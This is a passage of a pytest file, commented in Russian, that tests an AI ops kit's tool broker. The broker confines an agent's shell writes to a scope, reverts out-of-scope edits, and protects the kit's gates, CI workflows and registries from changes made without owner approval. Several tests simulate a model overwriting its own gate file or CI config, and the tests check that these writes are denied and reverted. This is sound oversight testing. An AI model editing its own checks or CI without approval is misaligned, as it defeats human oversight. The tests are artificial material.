        assert (p0_repo / "out_of_scope" / "x.py").read_text() == "orig = 1\n", "правка не откачена"

    def test_model_shell_in_scope_passes(self, p0_repo):
        """In-scope shell-запись по-прежнему проходит: сторож судит только вне scope."""
        policy = tool_broker.sandbox_policy(child_root=str(p0_repo), write_scope=["src/"])
        ev = tool_broker.execute(
            {"op": "shell", "command": "echo 'y = 2' > src/main.py"}, p0_repo, policy)
        assert ev["allowed"] is True, ev.get("reason")
        assert ev["fs_guard"]["violations"] == []
        assert (p0_repo / "src" / "main.py").read_text().strip() == "y = 2"

    def test_install_policy_keeps_out_of_scope_writes(self, p0_repo):
        """Разведение политик: фаза install пишет lock/артефакты вне scope и НЕ откатывается.

        _install_dependencies снимает shell_scope_guard у КОПИИ политики — модельная петля остаётся
        под guard, установка зависимостей нет."""
        import copy
        model_policy = tool_broker.sandbox_policy(child_root=str(p0_repo), write_scope=["src/"])
        install_policy = copy.copy(model_policy)
        install_policy.shell_scope_guard = False
        ev = tool_broker.execute(
            {"op": "shell", "command": "echo lock > out_of_scope/x.py"}, p0_repo, install_policy)
        assert ev["allowed"] is True, "install обязан мочь писать вне scope (lock-файлы/артефакты)"
        assert model_policy.shell_scope_guard is True, "модельная политика не должна быть ослаблена"


def _make_kit_markers(root):
    """Проставить корневые маркеры исходников кита: пакет + VERSION + манифест."""
    (root / "ai_ops_kit").mkdir(parents=True, exist_ok=True)
    (root / "ai_ops_kit" / "__init__.py").write_text("", encoding="utf-8")
    (root / "VERSION").write_text("4.0.0\n", encoding="utf-8")
    (root / "manifest").mkdir(parents=True, exist_ok=True)
    (root / "manifest" / "ai-ops-manifest.yaml").write_text("kind: ai-ops-manifest\n", encoding="utf-8")


@pytest.fixture
def self_host_repo(tmp_path):
    """Клон исходников кита (self-host): корневые маркеры пакета + движок/CI/реестры с коммитом,
    чтобы пост-фактум сторож shell мог сверить delta и откатить."""
    repo = tmp_path / "kit"
    for d in ("src", ".github/workflows", "ai_ops_kit/gates", "registry"):
        (repo / d).mkdir(parents=True)
    _make_kit_markers(repo)
    (repo / "src" / "main.py").write_text("x = 1\n", encoding="utf-8")
    (repo / ".github" / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
    (repo / "ai_ops_kit" / "gates" / "g.py").write_text("GATE = 1\n", encoding="utf-8")
    (repo / "registry" / "policy.yaml").write_text("k: v\n", encoding="utf-8")
    _git_p0(repo, "init", "-q")
    _git_p0(repo, "config", "user.email", "t@example.com")
    _git_p0(repo, "config", "user.name", "t")
    _git_p0(repo, "add", "-A")
    _git_p0(repo, "commit", "-qm", "seed")
    return repo


@pytest.mark.critical_path
@pytest.mark.unit
class TestP0SelfHostEngineProtected:
    """P0-2 (аудит 04.09): движок/CI/реестры кита (.github/, ai_ops_kit/, registry/) — под owner-approval,
    но ТОЛЬКО когда прогон идёт над САМИМ китом (self-host / догфуд). Не approval — не хардблок: кит с
    явным одобрением владельца править себя может, молча тем же прогоном — нет.

    Пробы КРАСНЕЮТ, если снять self-host-условие (`if _is_kit_self_host(...)` -> `if False`): движок
    перестанет быть protected на self-host, и правки .github/ / ai_ops_kit/ без одобрения пройдут.
    """

    # ── self-host: детект ──────────────────────────────────────────────────────────────────────
    def test_detects_kit_sources_as_self_host(self, self_host_repo):
        assert tool_broker._is_kit_self_host(self_host_repo) is True

    def test_ordinary_child_is_not_self_host(self, tmp_path):
        """Дочка (нет корневых маркеров кита) self-host'ом НЕ считается — движок не навязан."""
        child = tmp_path / "child"
        (child / "src").mkdir(parents=True)
        (child / ".ai-ops.yaml").write_text("kind: ai-ops-child-config\n", encoding="utf-8")
        assert tool_broker._is_kit_self_host(child) is False

    def test_partial_markers_not_self_host(self, tmp_path):
        """Одного пакета мало: без VERSION+манифеста — не self-host (не ловим совпадение имени)."""
        root = tmp_path / "partial"
        (root / "ai_ops_kit").mkdir(parents=True)
        (root / "ai_ops_kit" / "__init__.py").write_text("", encoding="utf-8")
        assert tool_broker._is_kit_self_host(root) is False

    # ── self-host: движок под approval-gate (decide) ──────────────────────────────────────────
    def test_self_host_engine_write_denied_without_approval(self, self_host_repo):
        """Правка ai_ops_kit/ на self-host без privileged+approval — запрещена (даже в write_scope)."""
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=["ai_ops_kit/", "src/"], child_root=str(self_host_repo))
        result = policy.decide({"op": "write", "path": "ai_ops_kit/gates/g.py"})
        assert result["allow"] is False
        assert "protected" in result["reason"]

    def test_self_host_github_write_denied_without_approval(self, self_host_repo):
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=[".github/", "src/"], child_root=str(self_host_repo))
        result = policy.decide({"op": "write", "path": ".github/workflows/ci.yml"})
        assert result["allow"] is False

    def test_self_host_registry_write_denied_without_approval(self, self_host_repo):
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=["registry/"], child_root=str(self_host_repo))
        result = policy.decide({"op": "write", "path": "registry/policy.yaml"})
        assert result["allow"] is False

    def test_self_host_engine_write_allowed_with_owner_approval(self, self_host_repo):
        """Approval-gate, НЕ хардблок: privileged + protected_path_write -> кит правит движок себе сам."""
        policy = tool_broker.Policy(level="privileged", write_scope=["ai_ops_kit/"],
                                    approvals={"protected_path_write"}, child_root=str(self_host_repo))
        result = policy.decide({"op": "write", "path": "ai_ops_kit/gates/g.py"})
        assert result["allow"] is True

    def test_self_host_non_engine_path_still_allowed(self, self_host_repo):
        """Обычный путь (src/) на self-host не задет — защита точечная, не тотальная."""
        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"],
                                    child_root=str(self_host_repo))
        assert policy.decide({"op": "write", "path": "src/main.py"})["allow"] is True

    # ── self-host: движок под сторожем shell (execute) ────────────────────────────────────────
    def test_self_host_shell_edit_engine_reverted_and_denied(self, self_host_repo):
        """`sed`/`echo >` по ai_ops_kit/gates на self-host без одобрения -> откат + запрет."""
        policy = tool_broker.sandbox_policy(child_root=str(self_host_repo), write_scope=["ai_ops_kit/"])
        ev = tool_broker.execute(
            {"op": "shell", "command": "echo 'GATE = 99' > ai_ops_kit/gates/g.py"}, self_host_repo, policy)
        assert ev["allowed"] is False, "правка движка на self-host без одобрения обязана быть запрещена"
        assert ev["fs_guard"]["violations"], "нарушение protected должно попасть в evidence"
        assert (self_host_repo / "ai_ops_kit" / "gates" / "g.py").read_text() == "GATE = 1\n", "не откачено"

    def test_self_host_shell_edit_github_reverted(self, self_host_repo):
        policy = tool_broker.sandbox_policy(child_root=str(self_host_repo), write_scope=[".github/"])
        ev = tool_broker.execute(
            {"op": "shell", "command": "echo 'on: pull_request' > .github/workflows/ci.yml"},
            self_host_repo, policy)
        assert ev["allowed"] is False
        assert (self_host_repo / ".github" / "workflows" / "ci.yml").read_text() == "on: push\n"

    # ── дочка (не кит): её .github/ в write_scope НЕ сломан ────────────────────────────────────
    def test_ordinary_child_github_write_in_scope_allowed(self, tmp_path):
        """РЕГРЕСС отката PR #504: обычная дочка пишет свой .github/ в рамках write_scope — РАЗРЕШЕНО.
        Self-host-защита её не касается (нет корневых маркеров кита)."""
        child = tmp_path / "child"
        (child / ".github" / "workflows").mkdir(parents=True)
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=[".github/"], child_root=str(child))
        result = policy.decide({"op": "write", "path": ".github/workflows/ci.yml"})
        assert result["allow"] is True, "дочкина запись в свой .github/ не должна быть сломана"

    def test_ordinary_child_engine_path_not_protected(self, tmp_path):
        """У дочки нет ai_ops_kit/ как protected по self-host — обычный путь в scope разрешён."""
        child = tmp_path / "child"
        (child / "ai_ops_kit").mkdir(parents=True)
        policy = tool_broker.Policy(level="controlled-write",
                                    write_scope=["ai_ops_kit/"], child_root=str(child))
        assert policy.decide({"op": "write", "path": "ai_ops_kit/x.py"})["allow"] is True
